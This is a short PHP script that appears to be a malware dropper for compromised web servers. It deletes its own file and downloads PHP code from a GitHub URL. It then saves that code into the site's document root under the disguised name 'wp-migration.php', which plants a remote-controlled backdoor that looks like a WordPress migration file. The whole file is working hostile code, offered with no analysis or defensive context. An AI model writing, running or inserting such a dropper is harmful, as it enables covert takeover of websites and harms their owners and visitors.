<?php
unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://raw.githubusercontent.com/dallasdilla/dillarep/refs/heads/main/l1/hTLvyEmV.php');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$c = curl_exec($ch);
if (strpos($c, '<?php')===false)  die('err dl');
if (is_file($_SERVER['DOCUMENT_ROOT'].'/wp-migration.php')) die('file exist');
$r = file_put_contents($_SERVER['DOCUMENT_ROOT'].'/wp-migration.php', $c);
if ($r===false) die('err saving');
die('/wp-migration.php');